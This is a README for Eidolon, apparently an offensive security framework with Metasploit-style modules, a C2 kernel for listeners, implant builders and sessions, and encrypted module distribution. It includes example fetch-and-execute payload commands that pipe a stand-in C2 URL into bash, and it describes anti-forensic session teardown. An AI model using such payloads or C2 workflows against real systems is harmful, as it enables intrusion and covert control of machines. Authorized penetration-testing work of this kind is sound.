<div align="center">

### **SPECTRAL CORE**
*Remote-Driven Module Arsenal · Modular · Spectral · Relentless*

[![Python](https://img.shields.io/badge/python-%E2%89%A53.8-cyan?style=flat-square)](https://python.org)
[![License](https://img.shields.io/badge/license-MPL--2.0-purple?style=flat-square)](LICENSE)
[![Version](https://img.shields.io/badge/version-3.3.0--SÉANCE-pink?style=flat-square)](pyproject.toml)
[![Deps](https://img.shields.io/badge/dependencies-1-blueviolet?style=flat-square)](pyproject.toml)

**English** · [فارسی](README.fa.md)

</div>

---

## 🌌 What is Eidolon?

**Eidolon** is a **modular, remote-driven framework** for managing and running security and
automation modules — a Metasploit-shaped workflow built around a radically small core:
everything beyond delivery, execution, and trust is a module, and every module is just
a Python file.

Instead of ten scattered scripts, one place holds it all:

- 🛰️ **Remote repositories** — pull modules from multiple remotes with priority resolution
- 📦 **One-command install** — `tar` / `tar.zst` / AES-encrypted packages / git clone
- 🧩 **Tiny module contract** — any `.py` with `OPTIONS` and `run(opts)` *is* a module
- 🖥️ **Interactive CLI** — tab completion, live prompts, true-color tables, session tracking
- 🔏 **TOFU trust model** — every installed module starts untrusted; integrity is explicit
- 🔐 **Encrypted distribution** — AES-256 packages for private module arsenals
- 💾 **Persistence** — globals and sessions survive restarts in SQLite
- 🎨 **Spectral UI** — true-color ANSI, gradient banner, Unicode chrome

---

## 🧭 Design Philosophy

Eidolon is built on four deliberate refusals:

1. **The framework never installs anything.** Module dependencies are *displayed*
   (`deps <name>` prints the exact `pip install` line); the operator runs it.
   A framework that shells out to pip on your behalf is a supply-chain hazard.
2. **Payloads are opaque.** An exploit module is a *delivery mechanism*. What gets
   delivered — shellcode path, executable, shell command, raw source, anything else —
   comes from the operator through four social-contract channels (below). The framework
   enforces nothing and judges nothing.
3. **The C2 is a separate layer.** Eidolon owns the exploit chain up to execution,
   then hands off. That layer lives in-repo as the **Wraith kernel** — a dependency-free
   `eidolon/wraith/` subpackage (a session registry + a typed payload store — two files,
   and that is all) that ships **zero servers, zero builders, zero wire contracts**:
   listeners and payload builders are ordinary modules; everything that actually runs is
   an agreement between two of them. The boundary is real: the exploit engine never
   touches the kernel, exploits never speak C2, and pointing a payload at Sliver or any
   other C2 instead remains a legitimate, first-class choice.
4. **Trust is earned, never assumed.** Downloads are verified by SHA-256 when the index
   provides it, and *cannot* proceed silently when it doesn't. First run of any module is
   recorded as untrusted (TOFU — Trust On First Use).

---

## ⚡ Installation

```bash
git clone https://github.com/null-flame/Eidolon.git
cd Eidolon
pip install .
eidolon
```

or from PyPI:

```bash
pip install eidolon-core
```

The only hard dependency is [`zstandard`](https://pypi.org/project/zstandard/).
`pyAesCrypt` is **optional** — needed only to pack or install encrypted packages
(the framework prints the exact command when it's missing; it never installs it).

---

## 🚀 Quick Start

```
$ eidolon

Eidolon ❯ repo sync
Eidolon ❯ repo search scanner
Eidolon ❯ repo install portscan
Eidolon ❯ use portscan
Eidolon (portscan) ❯ set target 10.0.0.7
Eidolon (portscan) ❯ run
```

Everyday commands:

| Command | Purpose |
|---|---|
| `modules` / `ls` | list loaded modules (`--all` for every type) |
| `search <kw>` | search local + all remote indexes |
| `info <name>` | metadata, options, requirements |
| `use <name>` / `back` | enter / leave a module context |
| `set <k> <v>` / `options` | configure and inspect options |
| `run` | execute the loaded module |
| `deps <name>` | show the module's pip requirements — never installs |
| `setg <k> <v>` / `globals` | workspace-wide persistent options |
| `sessions` / `status` | session tracking and workspace state |

---

## 🧩 The Module Contract

A module is any Python file exposing `OPTIONS` and `run(opts)`. That is the entire
mandatory contract:

```python
# hello_probe.py
NAME        = "hello-probe"            # optional metadata
VERSION     = "1.0.0"
DESCRIPTION = "Greets a host and reports latency."
CATEGORY    = "recon"
MODULE_TYPE = "auxiliary"              # exploit | listener | payload | post-exploit | auxiliary | generic
AUTHOR      = "you"
RANK        = "normal"                 # advisory quality grade (see below)
TARGETS     = []                       # advisory: what this applies to
REFERENCES  = []                       # advisory: CVE ids / writeups / vendor notes
REQUIREMENTS = ["httpx"]               # shown by `deps`, never installed

OPTIONS = {
    "host": {
        "value": "",
        "required": True,
        "desc": "Target hostname or IP",
    },
    "port": {
        "value": 80,
        "required": False,
        "desc": "TCP port to probe",
    },
}

def run(opts):
    # opts is a flat dict of resolved values: {"host": "...", "port": 80}
    return f"{opts['host']}:{opts['port']} reachable"
```

- `OPTIONS` drives the CLI: `set`, `options`, tab completion, and required-value
  validation are all generated from it.
- `MODULE_TYPE` separates the cast: `exploit` (the break-in), `post-exploit`
  (recon, escalation, and the interactive takeover via a `shell()` handler),
  `listener` + `payload` (the C2 halves), and tooling (`auxiliary`, `generic`).
- `REQUIREMENTS` is declarative only — `deps` prints `pip install httpx`; nothing
  is ever auto-installed.

### Advisory metadata — RANK / TARGETS / REFERENCES

Three optional module-level fields carry *advisory* knowledge. The framework
never enforces any of them — they exist so an operator can judge a module in
one glance and so remote repositories can carry reputation instead of binaries:

```python
RANK        = "great"    # excellent > great > good > normal > average > low > manual
TARGETS     = ["linux/x86_64", "nginx 1.18-1.20", "windows/x64 == 10 build 19041"]
REFERENCES  = ["CVE-2021-44228", "https://attackerkb.com/..."]
```

- **`RANK`** — the author's quality grade, Mir-model vocabulary (excellent →
  manual). `info`, `repo list-modules -s`, and `repo info` render it color-coded;
  remote indexes may add a `"rank"` key per module and it displays the same way.
- **`TARGETS`** — a free-form list of what the technique applies to: platform/
  arch, service with version range, kernel build, network range. Advisory only —
  the module stays authoritative about what it will actually do.
- **`REFERENCES`** — CVE ids, advisories, writeups. Displayed by `info` and
  `repo info`; a module without references is fine, a module *with* them is
  easier to trust.

All three fall back gracefully: untouched, they simply never appear.

### Writing modules locally

```
Eidolon ❯ new_module my_probe ~/code
```

scaffolds a fully documented skeleton (metadata, options, run, docstring guidance),
ready to fill in — pick the type on the command line (`exploit`, `listener`,
`payload`, `post-exploit`, `auxiliary`, `generic`) or answer the interactive
menu; with `--fa` the scaffold and its embedded guidance are Persian. Drop any
file straight in with `add_module <src> [dest] [--force]` or `install_local`.

### Payload channels (exploit modules)

Exploit modules decide *how* they deliver and treat the payload as an opaque blob
provided by the operator. Four conventional option names — a social contract, not an
enforced API:

| Channel | Meaning |
|---|---|
| `SHELLCODE_PATH` | path to shellcode on the operator's machine |
| `PAYLOAD_FILE` | path to any executable file |
| `CMD` | a shell command (`curl https://c2.example/payload \| bash`, …) |
| `PAYLOAD_SRC` | raw source / anything else the module author dreams up |

This keeps Eidolon agnostic about C2s: point `CMD` at Sliver's implant generator, at a
**Wraith** listener module (below), at whatever comes next — the module just delivers it.

### Payload integration with a Wraith listener module — the dedicated `payload` field

Payloads in the store carry a **type** and a wire **protocol tag**. An exploit asks
for one by declaring a single dedicated option field — the framework validates on
`set`, filters by type, and hands `run()` the resolved manifest instead of a string:

```python
OPTIONS = {"payload": {"value": "", "required": False,
                       "desc":  "payload name from `c2 payloads`, or any raw file path",
                       "kind":  "payload",                 # framework-managed field
                       "types": ("file-posix", "file-win")}}

def run(opts):
    artifact = opts["payload"]["path"]          # ready to deliver
    opts["payload"]["type"]                   # "file-posix" — the store guarantees it
    opts["payload"]["protocol"]               # OPTIONAL free label — display only
```

`set payload ghost-go` fails on the spot if `ghost-go` is not one of the declared
types — a wrong artifact can never slip into the wrong delivery path. A raw file
path always passes (freedom) and arrives typed `"external"`. Under the hood this is
`eidolon.wraith.store.resolve_payload()`, which any module may call directly.

Raw operator files (any path) stay first-class: they resolve with type `"external"`
and the module stays authoritative. Freedom by default, typing when you want it.

### The exploit ↔ payload relationship — external C2s on equal footing

The exploit is a *delivery mechanism*; the payload store is merely one optional
source among equals. The flexibility story is deliberately manual-first:

- **External C2, zero wiring** — point the module's channels at a Sliver or
  MSF artifact and the exploit delivers it. No framework involved.
- **Manual by default** — the operator fills the info page by hand: a file
  path (absolute or relative, `./payload`), a shell command
  (`curl https://host/i.sh | bash`), or raw source.
- **Automation only on command** — a *typed store payload* behaves like one
  more external deliverable; its single convenience (the manifest dict, type-
  checked, with the builder's `config` riding along) is granted ONLY when the
  operator explicitly types `set payload <name>`. The framework never chooses
  or fetches anything by itself.

### Multi-file modules

A module may be a directory. The entry file carries `OPTIONS` + `run(opts)`; helpers
and per-API logic live in sibling files imported relative to the module:

```
my_toolkit/
├── main.py          # OPTIONS, run(opts), imports _providers
├── _providers.py    # shared plumbing
└── providers/
    ├── alpha.py
    └── beta.py
```

```python
# main.py
from ._providers import dispatch          # relative import inside the module dir

def run(opts):
    return dispatch(opts["provider"], opts)
```

The loader imports the entry file as a module and leaves the rest of the directory
alone — no registration ceremony, no manifest. Archive only `.py` files you want
shipped (the packer skips `_*`, `@*`, dotfiles, and `__pycache__`).

---

## 👻 Wraith — the C2 kernel (modules own everything else)

A minimal command-and-control **kernel** inside the repository — `eidolon/wraith/` —
**never imported by the exploit engine**, shipping **zero servers, zero
listeners, zero compilers, zero wire contracts**. The kernel is just the shelves:
a session registry and a typed payload store. Everything that runs is an ordinary
module, and every capability is an agreement between two modules — never a rule
the framework enforces:

- **The kernel is two files** — thread-safe session registry (`sessions.py`, with a
  process-wide `default_registry()`) and the typed payload store (`store.py`). No
  protocol document, no frame spec, no transport code. There is exactly one
  exception the kernel volunteers because it makes life easier: the store keeps a
  per-artifact **type** so exploits can filter what they are willing to deliver.
- **Listeners are modules** — a module of type `listener` runs ANY transport it
  likes (WebSocket, raw TCP, HTTP beaconing, whatever comes next) with any
  libraries it likes. Its internal layout is entirely free; the framework knows
  only its entry script — `use <listener>` · `set port 8443` · `run` and done. It
  registers sessions into the kernel registry, publishes its operating profile
  (`EIDOLON_SHELL.wraith_listener` → `url` / `token` — plus tags if it wants) and
  defines `stop()`. Listener-type modules auto-background as jobs on `run`.
- **Builders are modules, not framework code** — the repository ships **zero**
  payload sources and **zero** compilers. A payload builder is simply a module of
  type `payload`: `gen <builder>` selects it (exactly like `use` — GEN MODE, and
  the framework never lets it near a listener), its parameters work like an
  exploit's (`set url …`, `set target_os …`), and `run` builds the artifact in
  *any* language the author pleases (Go, Nim, C, Rust, C#, bash, python,
  PowerShell…) and registers it in the store — exploits pick it up by name,
  type-filtered.
- **Artifacts land where YOU work** — a builder writes to an explicit `output`
  option if you set one, and otherwise to your **current working directory**
  (open eidolon in `~/HACK/`, build, get `~/HACK/payload.exe`). It is registered
  with `keep=True`: the file STAYS at the operator's path, the manifest records
  that absolute location, and nothing is copied into temp or framework dirs.
  `/tmp`, `/var/tmp`, `/dev/shm` and `%TEMP%` are refused on both sides —
  registration and `set payload <path>` alike — so no artifact ever silently
  depends on throwaway staging data.
- **Async is first-class** — `run()` may be a plain `def` or an `async def`; the
  framework runs the event loop itself, foreground or as a managed background
  job. An async listener needs zero thread/loop ceremony of its own.
- **Typed payload store** — every artifact labeled (file-posix / file-win /
  shellcode / cmd / code) with a SHA-256 manifest
- **No wire contract** — the kernel never connects anything, so it never enforces
  a handshake. A payload's `protocol` tag is OPTIONAL free metadata for humans and
  remote indexes. If your listener wants to authenticate implants, it may — a
  wrong token is simply dropped by the listener itself.
- **Session handoff** — a listener may give a session an `interact` handler. Then
  `use <sid>` (a prefix is enough) makes the console step aside and the module's
  own shell take over — your prompt, your commands, full tab completion. `back`
  returns control; the session may tear itself down for stealth.
- **Post-exploit modules** — type `post-exploit`: requires initial access and
  owns everything after the break-in (full recon, privilege escalation) and
  declares an extra `shell(opts)` handler. The operator runs `shell` with the
  module selected and the module hands the console to the shell channel it got
  FROM a listener — raw bash, cmd, PowerShell, any dialect negotiated between
  the listener and the implant, never imposed by the framework. The scaffold's
  default picks the session from the kernel registry (`c2 sessions`) and calls
  its `interact()`; keeping the console in-module with a subshell + full tab
  completion is equally supported. `run(opts)` and `shell(opts)` are both
  sync-or-async, first-class.

### The two-second workflow

```
eidolon ❯ use c2/ws/listener
eidolon (listener) ❯ set port 8443
eidolon (listener) ❯ run                  ⇪ auto-backgrounds
                                         ⬢ job #1 — listener online (hidden endpoint)
eidolon ❯ gen ghost-implant              (a payload module — GEN MODE, selection only)
eidolon (ghost-implant) ❯ set target_os linux
eidolon (ghost-implant) ❯ run            ⇪ builds + registers
                                         ⬦ registered payload: ghost-go [file-posix]
... exploit module delivers the binary to the target ...
  ⬢ payload connected  5f8e12c2 · alice@corp-ws · go/linux-amd64 · 10.4.2.9:51515
eidolon ❯ use 5f8e                      (into the live session — module-owned shell,
                                          full tab completion, capabilities are theirs)
eidolon ❯ c2 sessions                   (live table — ● active, ○ lost)
eidolon ❯ kill 1                        (done — anti-forensics: kill-on-detach)
```

The instant a payload dials home, the console reports it — timestamped identity,
target user, host, implant flavor and address.

### Commands

| Command | Effect |
|---|---|
| `use <listener module>` · `set` · `run` | the whole listener story — select it, configure it like any module; `run` auto-backgrounds it as a job |
| `gen <payload module>` | select a builder (GEN MODE — payload/listener selection only) — params via `set`, build + register via `run` |
| `use <sid>` | enter a live C2 session — the framework resolves the prefix and steps aside; the module's own shell takes over with full tab completion |
| `shell` | post-exploit takeover — invokes the selected module's `shell(opts)` handler, which hands over the channel negotiated with its listener |
| `jobs` | background jobs — id · status · uptime |
| `kill <id>` | clean stop via the module's `stop()` (also automatic on `exit`) |
| `run --bg` | background ANY module (listener-type modules always run as jobs) |
| `c2 status` / `c2 sessions` | read-only view — listener profile, job count, live session table |
| `c2 payloads` | the typed payload store (name · type · backend · sha256 — protocol if the author labeled one) |

### No contract, only agreements

The kernel refuses to mediate. It never connects to anything, so it cannot
enforce a protocol — and it will not pretend to. What exists is a soft convention
that any pair of modules is free to ignore:

```
  listener module: publishes url + token (+ tags, any count, any vocabulary)
  payload module : embeds whichever profile it was built against — or none
  → whether they speak is decided entirely by THEIR code
```

A `protocol` tag in the store manifest (`"ws-json-async"`, `my-funky-dialect`, or
empty) is a label for humans and optional index fields (`"protocol"` /
`"payload_type"`) — nothing checks a handshake, no close code kills a connection,
no frame cap governs a stream. Shell, screenshots, file transfer, credential
helpers: those exist iff the listener and the payload were built to agree on
them. That freedom is the point — one author's WS/JSON async pair and another's
TCP/protobuf pair coexist on the same machine without the kernel ever noticing.

### Architecture — two small files, one folder, zero servers

```
eidolon/
  wraith/
    sessions.py   thread-safe session registry (+ shared default_registry())
    store.py      typed payload store + resolve_payload() type gateway
```

Listeners and builders live with the modules (`~/.eidolon/modules/whatever/`) —
outside the framework, exactly where their authors want them, with a completely
free internal layout (the framework knows only the module's entry script).

The framework itself now carries **zero C2 dependencies** — a WebSocket listener
module simply declares `websockets>=11` in its `REQUIREMENTS` (displayed by
`deps`, never auto-installed). Frame caps, chunk sizes, TLS certs, even whether a
dropped session marks `lost` or sweeps nothing — every limit and every behavior
is module business now; the kernel's only opinions are the registry and the
store.
------

## 🛰️ Repository System

### Remotes

Module indexes are plain JSON. The default remote is the official Eidolon arsenal;
add your own with priority — higher priority wins name collisions:

```
Eidolon ❯ repo add https://example.com/my-arsenal.json
Eidolon ❯ repo priority https://example.com/my-arsenal.json 20
Eidolon ❯ repo sync
Eidolon ❯ repo list-modules
```

### Index format

```json
{
  "name": "My Arsenal",
  "description": "Curated modules",
  "modules": [
    {
      "name": "portscan",
      "path": "network/portscan",
      "type": "tar",
      "version": "1.0.0",
      "url": "https://mirror.example/portscan.tar.zst",
      "sha256": "c6fa41440acd93f7a4647bca39122e039d9b1834c85225126d85df5ae0b34eed",
      "description": "Async TCP port scanner"
    }
  ]
}
```

- `type` — `tar` (`.tar` / `.tar.zst` / `.tar.zst.enc`) or `git`
- `path` — install location under `~/.eidolon/modules/` (traversal is rejected)
- `sha256` — strongly recommended; see the security model below
- `enc` / `password` / `key` — for encrypted packages, see below

### Install-time security model

- **SHA-256 verified when provided** — mismatch aborts the install, always.
- **Hashless packages are never silent** — the framework prints two loud SECURITY
  warnings and demands explicit consent: the operator must *type the module name* and
  then *type `yes`*. Anything else aborts with nothing written to disk.
  A hard block flag (`ENFORCE_SHA256` in `eidolon/repo.py`) ships `False` for the
  3.2.x series and will flip to `True` in a future release.
- **Anti-DoS limits** — indexes are capped at 5 MB, archives at 50 MB, enforced both
  via `Content-Length` and mid-stream.
- **Safe extraction** — archive members are screened for absolute paths, `..`
  traversal, and unsafe links before anything touches disk; installs go to a staging
  directory and are swapped atomically, with rollback on failure.
- **Git transports are HTTPS-only** — `ext::` and other non-HTTPS transports are
  refused, and `--` separates options from arguments.

---

## 🔐 Encrypted Packages (AES-256)

For private arsenals: pack a module into an encrypted package that a file host cannot
read, and that only holders of the password can install.

```
Eidolon ❯ repo pack ~/code/my_module my_module.tar.zst.enc
  package password: ********

  ▪ packed ~/code/my_module → my_module.tar.zst.enc
  • sha256 : 358687d4be89b838835ed1f2d123f887bda3d6dd5815f1f4eafc3a4345cf8a64
  • index entry fields:
      "url"      : "<host this file>"
      "sha256"   : "358687d4be89…"
      "enc"     : true
```

Format: `tar → zstd → pyAesCrypt.encryptStream` (AES-256-CBC + HMAC, 1 MB buffers).
Decryption is the exact inverse at install time.

Index wiring, two modes:

| Index entry | Behavior at install |
|---|---|
| `"enc": true` (no password) | operator is prompted via `getpass` — **real access control** for private modules |
| `"enc": true, "password": "…"` | decrypts silently — *obfuscation only*: anyone with the index can decrypt |

Wrong password, empty password, or a cancelled prompt aborts the install cleanly —
nothing is extracted.

---

## 🔏 Trust (TOFU)

Every `.py` file installed from a remote is registered **untrusted**. The first
execution is your moment of review — after inspecting the source (`repo source <name>`
prints it), promote it:

```
Eidolon ❯ repo source portscan
Eidolon ❯ trust portscan          # or: trust --all
Eidolon ❯ trusted [--all]
Eidolon ❯ verify                  # re-check digests of everything trusted
```

`untrust <module>` revokes; digests are cached so `verify` detects on-disk tampering
between runs.

---

## 🗂️ Workspace Layout

```
~/.eidolon/
├── modules/          # installed modules (path from the index)
├── cache/            # synced indexes and downloads
├── remotes.json      # remote registry (url / enabled / priority)
└── eidolon.db        # SQLite: globals, sessions, trust registry
```

---

## 🗺️ Roadmap

- Test suite + CI (the install/AES/trust flows are verified end-to-end manually; they
  are being landed as automated tests)
- `ENFORCE_SHA256 = True` — hard-block hashless archives in an upcoming release
- **Wraith kernel** — ✅ 3.3.0: the framework ships the SDK only (sessions /
  store — two files) plus listener flow (`use` · `set` · `run` auto-job), `gen`
  builder selection, `jobs` / `kill`, and `use <sid>` session handoff with
  module-owned tab-completed shells. No wire contract — capabilities are
  agreements between modules. Next: session persistence

---

## ⚠️ Disclaimer

Eidolon is a tool for **authorized** security testing, research, and automation.
Running modules against systems you do not own or lack explicit permission to test is
illegal in most jurisdictions. The authors accept no liability for misuse.

---

## 📄 License

[MPL-2.0](LICENSE)
